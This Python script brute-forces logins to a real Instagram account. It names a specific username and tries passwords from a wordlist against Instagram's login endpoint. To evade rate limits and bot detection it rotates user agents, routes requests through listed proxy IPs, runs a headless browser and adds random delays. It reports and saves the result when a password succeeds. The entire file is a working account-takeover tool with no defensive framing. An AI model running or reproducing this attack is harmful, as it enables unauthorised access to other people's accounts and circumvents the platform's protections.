import requests
import time
import random
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# Define the user and password file
username = 'bohmiiiidd'
password_file = 'pass.txt'
login_url = 'https://www.instagram.com/accounts/login/'

# List of user agents to rotate
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    # Add more user agents here...
]

# Proxy list to rotate (ensure you have working proxies)
proxies = [
    "181.39.233.212:8080",
    "167.235.185.47:6969",
    "118.70.12.171:53281",
    # Add more proxies here...
]

# Define headers for the requests
headers = {
    'User-Agent': random.choice(user_agents),
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://www.instagram.com/accounts/login/',
    'Origin': 'https://www.instagram.com',
}

def get_initial_parameters(session):
    """ Get CSRF token and other parameters needed for login """
    response = session.get(login_url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Extract CSRF token from cookies
    csrf_token = session.cookies.get_dict().get('csrftoken')

    # Check if the CSRF token was successfully extracted
    if not csrf_token:
        print("Failed to retrieve CSRF token.")
        return None
    
    return csrf_token

def setup_browser():
    """ Set up a headless browser to mimic user behavior """
    options = Options()
    options.add_argument("--headless")  # Run browser in headless mode (no GUI)
    options.add_argument(f'user-agent={random.choice(user_agents)}')
    driver = webdriver.Chrome(options=options)
    
    return driver

def mimic_human_behavior(driver, session):
    """ Use a headless browser to simulate user behavior """
    driver.get(login_url)

    # Simulate user actions, like typing username and password, clicking
    time.sleep(random.uniform(2, 5))  # Random delay before interacting with the page

    # Capture cookies from Selenium and convert them to a format requests can use
    cookies = driver.get_cookies()
    for cookie in cookies:
        session.cookies.set(cookie['name'], cookie['value'])

def brute_force_login(verbose=False):
    # Create a session to persist cookies and parameters
    session = requests.Session()

    # Get initial parameters such as CSRF token
    csrf_token = get_initial_parameters(session)
    if csrf_token is None:
        print("Could not retrieve initial parameters. Exiting...")
        return

    # Add the CSRF token to the headers
    headers['X-CSRFToken'] = csrf_token

    # Load passwords from the file
    try:
        with open(password_file, 'r') as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"Password file '{password_file}' not found.")
        return

    # Set up headless browser for mimicking human behavior
    driver = setup_browser()

    # Mimic human behavior to make it look less like a bot
    mimic_human_behavior(driver, session)

    # Loop through each password in the list
    for password in passwords:
        # Update headers and proxies dynamically
        headers['User-Agent'] = random.choice(user_agents)
        proxy = random.choice(proxies)
        proxy_dict = {
            "http": proxy,
            "https": proxy,
        }

        # Prepare the login data (username and password)
        login_data = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false',
        }

        # Random delay between requests to avoid detection
        delay = random.uniform(1, 5)
        time.sleep(delay)

        # Send the POST request to the login page with the data and headers
        try:
            response = session.post('https://www.instagram.com/accounts/login/ajax/', data=login_data, headers=headers, proxies=proxy_dict)
        except requests.RequestException as e:
            print(f"Request failed: {e}")
            continue

        # Verbose mode: print link state and response pattern for each attempt
        if verbose:
            print(f"[*] Trying password: {password}")
            print(f"URL: {response.url}")
            print(f"Status Code: {response.status_code}")
            print(f"Response Length: {len(response.text)} characters")

        # Check the response to see if the login was successful
        if 'userId' in response.text:
            print(f'[+] Password found: {password}')
            print(f'Page URL: {response.url}')

            # Save the response body into an HTML file
            with open("login_response.html", "w") as html_file:
                html_file.write(response.text)

            print("The response body has been saved to 'login_response.html'. You can open it in a browser.")
            return
        else:
            print(f'[-] Failed: {password}')

    print('[-] Brute-force attack finished. No valid password found.')

    # Close the browser after brute-force attempts
    driver.quit()

# Call the brute-force function
if __name__ == "__main__":
    # Set verbose to True to enable printing of patterns
    brute_force_login(verbose=True)
